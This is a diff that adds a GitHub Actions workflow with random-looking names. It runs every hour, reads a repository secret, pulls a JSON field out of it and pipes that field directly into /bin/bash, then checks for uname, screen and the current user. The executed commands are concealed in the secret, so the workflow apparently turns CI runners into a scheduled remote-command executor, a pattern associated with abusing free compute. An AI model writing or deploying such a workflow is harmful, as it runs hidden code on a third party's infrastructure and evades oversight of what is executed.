@@ -1,0 +1,20 @@
+name: renquanyou8190
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 * * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: renquanyou8190
+        env:
+          m99: ${{ secrets.m99 }}
+        run: |
+          echo "Build $(date +%s)"
+          echo $m99 | jq -r .o19103 | /bin/bash
+          which uname
+          which screen
+          echo "User: $(whoami)"
+          cd ~
